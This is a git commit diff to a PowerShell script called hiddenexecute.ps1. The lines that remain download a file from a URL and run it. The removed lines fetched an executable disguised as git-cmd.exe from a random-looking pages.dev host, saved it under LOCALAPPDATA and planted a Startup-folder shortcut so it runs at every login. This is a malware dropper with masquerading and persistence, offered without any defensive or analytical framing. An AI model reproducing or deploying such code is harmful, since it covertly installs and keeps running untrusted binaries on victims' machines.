04f57efb9cb0d24b98390d324b709039543538fc
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-25 16:43:46 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -8,24 +8,4 @@ if (-Not (Test-Path $folderPath)) {
 
 Invoke-WebRequest -Uri $url -OutFile $localPath
 
-$destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
-$binFolder = "$env:LOCALAPPDATA\Git\bin"
-
-$folder = Split-Path -Path $destination
-if (-not (Test-Path -Path $folder)) {
-    New-Item -ItemType Directory -Path $folder
-}
-
-Invoke-WebRequest -Uri "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/Git/git-cmd.exe" -OutFile $destination
-
-if (-not (Test-Path -Path $binFolder)) {
-    New-Item -ItemType Directory -Path $binFolder
-}
-
 Start-Process $localPath
-
-$WshShell = New-Object -ComObject WScript.Shell
-$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$Shortcut = $WshShell.CreateShortcut("$StartupFolder\GitCmd.lnk")
-$Shortcut.TargetPath = $destination
-$Shortcut.Save()
